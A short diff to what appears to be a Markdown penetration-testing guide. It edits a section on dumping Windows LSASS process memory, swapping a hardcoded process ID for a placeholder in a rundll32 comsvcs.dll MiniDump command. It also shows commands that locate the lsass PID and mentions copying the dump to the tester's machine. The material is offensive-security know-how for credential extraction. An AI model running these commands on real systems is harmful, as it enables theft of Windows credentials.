@@ -85,7 +85,7 @@ A file called lsass.DMP is created and saved in %temp%. `cp <path_lsass.dmp> <di
 ````
 > tasklist /svc (Find PID Lsass from cmd)
 > Get-Process lsass (Find PID Lsass from powershell)
-> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
+> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
 ````
 
 After extracting the process, we will copy it to our machine.
